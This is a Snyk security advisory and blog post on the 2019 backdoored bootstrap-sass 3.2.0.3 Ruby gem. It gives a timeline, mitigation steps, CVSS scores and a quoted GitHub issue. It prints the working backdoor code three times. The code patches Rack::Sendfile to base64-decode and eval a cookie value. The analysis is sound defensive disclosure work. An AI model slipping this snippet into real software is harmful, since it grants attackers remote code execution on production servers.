# Malicious remote code execution backdoor discovered in the popular bootstrap-sass Ruby gem

April 4, 2019

 0 mins read

On March 26, 2019, a malicious version of the popular `bootstrap-sass` package, that has been downloaded a total of 28 million times to date, was published to the official RubyGems repository. Version `3.2.0.3` includes a [stealthy backdoor](/vuln/SNYK-RUBY-BOOTSTRAPSASS-174093/) that gives attackers remote command execution on server-side Rails applications.

We have [already added the vulnerability](/vuln/SNYK-RUBY-BOOTSTRAPSASS-174093/) to our database, and if your project is being monitored by Snyk, you will have already been notified by our routine alerts, if your application contains the malicious package. If not, [you should test, for free](https://app.snyk.io/add), to see if your application is affected by the malicious version by testing your application code repository with Snyk.

If you find that your Rails application is making use of the vulnerable project take immediate action and replace the vulnerable version, 3.2.0.3, with the re-published 3.2.0.4 as first response mitigation without requiring major version upgrades.

On the same day, Derek Barnes opened a GitHub issue for the `twbs/bootstrap-sass` repository that raised an issue related to the malicious version and pointed out a suspicious snippet of code that is bundled with version `3.2.0.3` of bootstrap-sass.

The backdoor was wisely hidden in the 3.2.0.3 version that was only published to RubyGems and no source of the malicious version existed on the GitHub repository and allowed remote attackers to dynamically execute code on servers hosting the vulnerable versions.

The `bootstrap-sass` package is very popular and the malicious backdoor potentially affects a large set of users. The package’s GitHub repository has been starred more than 12,000 times, and features over 27 million downloads in total. The current version, 3.4.1, has over 217,000 downloads.

A quick analysis shows roughly 1,670 GitHub repositories that may have been exposed to the malicious library through direct use. This number will increase significantly when counting its usage in applications as a transitive dependency.

## Re-cap of the attack timeline

* Version 3.2.0.2 was removed from the RubyGems registry. This means that the tarball is still accessible directly via the RubyGems repository, however, it is not visible to the package manager. As far as we can tell, this version is not malicious and has been yanked by the malicious actors in order to get users to upgrade to 3.2.0.3 which they published next.
* On March 26th, version 3.2.0.3 was published by malicious actors. The version includes hides a backdoor in a new file, `lib/active-controller/middleware.rb`. The backdoor taps into another Ruby module and modifies it so that specific cookies that are sent by the client will be Base64 decoded and then evaluated in runtime, to effectively allow remote code execution.
* The malicious version 3.2.0.3 matches SHA256 checksum 366d6162fe36fc81dadc114558b43c6c8890c8bcc7e90e2949ae6344d0785dc0.
* We assume that the attacker has obtained the credentials to publish the malicious RubyGems package from one of the two maintainers, but this has not been officially confirmed.
* On March 26th at 10:59PM GMT Derek Barnes opened an issue on the public repository to inform the maintainers and the wider community of his suspicion regarding the code found in version 3.2.0.3.
* On March 26th at 11:56PM GMT, just an hour later, the malicious version was removed from the RubyGems repository and the maintainers confirmed that they updated their credentials.
* Due to both 3.2.0.2 and 3.2.0.3 version being removed, users needed to upgrade to other alternate versions, such as 3.4.1, as recommended by the project maintainers.
* Today, on April 3rd 2019, at 4:10PM GMT, the project maintainers released a new version, 3.2.0.4, which is identical to the retracted version, 3.2.0.2, to allow users to easily upgrade to a safe version without needing to resort to a major version change.

April 4th 2019 4:46PM update: the vulnerable version of 3.2.0.2 was removed incorrectly and remained in the RubyGems registry through mirrors for several days further. It was [reported](https://github.com/rubygems/rubygems.org/issues/1941#issuecomment-479906700) now that it is now entirely unavailable.

## Unraveling the vulnerability

To gain more insight into the malicious backdoor we need to understand how the `bootstrap-sass` package fits into the development practices of a Ruby web application.

`bootstrap-sass` is an official project that spawned from the Twitter Bootstrap parent project and provides a SASS-powered version of bootstrap 3. SASS is a tool that empowers frontend engineers and provides a higher level abstraction for writing CSS files through capabilities such as mixins, variables, conditional statements, and so on.

SASS tooling is mostly related to frontend assets and would normally be leveraged as part of a frontend build phase which creates static assets, and these are served by static web servers. However for Ruby on Rails-powered applications that serve both backend and frontend code, the `bootstrap-sass` project provides Ruby bindings that are used by the framework.

When a Rails application wants to make use of the `bootstrap-sass` library it declares this dependency and updates the relevant CSS imports in order to include bootstrap-sass to compile the CSS files during runtime.

When `bootstrap-sass` is imported, it imports the following malicious middleware code that resides on `lib/active-controller/middleware.rb`:

```
1begin
2 require 'rack/sendfile'
3 if Rails.env.production?
4   Rack::Sendfile.tap do |r|
5     r.send :alias_method, :c, :call
6     r.send(:define_method, :call) do |e|
7       begin
8         x = Base64.urlsafe_decode64(e['http_cookie'.upcase].scan(/___cfduid=(.+);/).flatten[0].to_s)
9         eval(x) if x
10       rescue Exception
11       end
12       c(e)
13     end
14   end
15 end
16rescue Exception
17 nil
18end
```

The backdoor in a nutshell:

* import rack/sendfile
* if the Rails application is running in a production environment, modify the `call` method
* The monkey-patching of the `call` method updates the original to read an HTTP cookie, named `___cfduid`, that was sent from the client-side, base64 decodes it, and then evaluates the dynamic code at runtime. After executing the dynamic code it calls the original `call` method.

## What should I do?

If your project is being monitored by Snyk, you will have already been notified by Snyk’s routine alerts, should your application contain this malicious package.

If however, you are not [monitoring your projects with Snyk](/signup/), you can run a one-off test for your open source project by [clicking here to test your repositories](https://snyk.io/test), or by using our CLI to test your projects locally.

## I’m affected, what should do I next?

If you found out your Rails application is making use of the vulnerable project take immediate steps to replace the current vulnerable version of 3.2.0.3 with the re-published 3.2.0.4 version as first response mitigation without requiring major version upgrades.

We encourage you to [connect your repositories with Snyk](/signup/) so you can monitor for malicious activity in the future as well as surface any other vulnerabilities that may exist in your application.

## How to fix?

Avoid using the malicious versions of `bootstrap-sass`.

## Overview

[bootstrap-sass](https://rubygems.org/gems/bootstrap-sass) is a Sass-powered version of Bootstrap 3, ready to drop right into your Sass powered applications.

Affected versions of this package are malicious.
The file `lib/active-controller/middleware.rb` contains a backdoor which will enable a remote attacker to run arbitrary code on the server by decoding a specific cookie value and evaluating its content.

## Details

When `bootstrap-sass` gets imported, it also imports the following malicious middleware code that resides on `lib/active-controller/middleware.rb`:

```
begin
 require 'rack/sendfile'
 if Rails.env.production?
   Rack::Sendfile.tap do |r|
     r.send :alias_method, :c, :call
     r.send(:define_method, :call) do |e|
       begin
         x = Base64.urlsafe_decode64(e['http_cookie'.upcase].scan(/___cfduid=(.+);/).flatten[0].to_s)
         eval(x) if x
       rescue Exception
       end
       c(e)
     end
   end
 end
rescue Exception
 nil
end

```

### CVSS Scores

version 3.1
### Snyk

9.8 critical

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is a total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact. For example, an attacker steals the administrator's password, or private encryption keys of a web server.

  **High**
* Integrity (I)

  There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component. Alternatively, only some files can be modified, but malicious modification would present a direct, serious consequence to the impacted component.

  **High**
* Availability (A)

  There is a total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed). Alternatively, the attacker has the ability to deny some availability, but the loss of availability presents a direct, serious consequence to the impacted component (e.g., the attacker cannot disrupt existing connections, but can prevent new connections; the attacker can repeatedly exploit a vulnerability that, in each instance of a successful attack, leaks a only small amount of memory, but after repeated exploitation causes a service to become completely unavailable).

  **High**

## Description

![@dgb](https://avatars.githubusercontent.com/u/175102?u=5ae423de17d3c1f3997a16f99d471e93f02b4b4e&v=4&size=48)[dgb](https://github.com/dgb)opened [on Mar 26, 2019](https://github.com/twbs/bootstrap-sass/issues/1195#issue-425685746)

Hi there,

We noticed that 3.2.0.2 was yanked, and 3.2.0.3 was published to RubyGems. We thought this might be because of [ruby-sass being deprecated](https://github.com/sass/ruby-sass#ruby-sass-is-deprecated), but we can't seem to see the 3.2.0.3 code on GitHub.

Looking further, there's some...interesting looking code in what i installed via `gem install bootstrap-sass -v 3.2.0.3` (in a file named `lib/active-controller/middleware.rb`):

```
begin
  require 'rack/sendfile'
  if Rails.env.production?
    Rack::Sendfile.tap do |r|
      r.send :alias_method, :c, :call
      r.send(:define_method, :call) do |e|
        begin
          x = Base64.urlsafe_decode64(e['http_cookie'.upcase].scan(/___cfduid=(.+);/).flatten[0].to_s)
          eval(x) if x
        rescue Exception
        end
        c(e)
      end
    end
  end
rescue Exception
  nil
end
```

I have not run this, and I'm a little concerned with what's going on here. It looks like it's loading a cookie and `eval`-ing it, which seems suspect. Please advise.

# Vulnerability Disclosure

We at Snyk value the security community and believe that a responsible disclosure of security vulnerabilities in open source packages helps us ensure the security and privacy of the users. We aim to provide a disclosure program for the security community to report security issues found within languages including JavaScript, Java, Python, .NET, Go, Ruby and PHP.

Using this form, you can disclose vulnerabilities you’ve found or vulnerabilities that are missing within [Snyk Vulnerability Database](https://security.snyk.io/), and we’ll help you verify the vulnerability and contact the maintainer. In addition, as a CVE Numbering Authority (CNA) we are also able to assign a CVE for the issue.

Before submitting a report, please review our disclosure policy which can be found [here](https://docs.snyk.io/disclosing-vulnerabilities/disclose-a-vulnerability-in-an-open-source-package).

For any questions or follow ups on the disclosure you may email us at report@snyk.io.
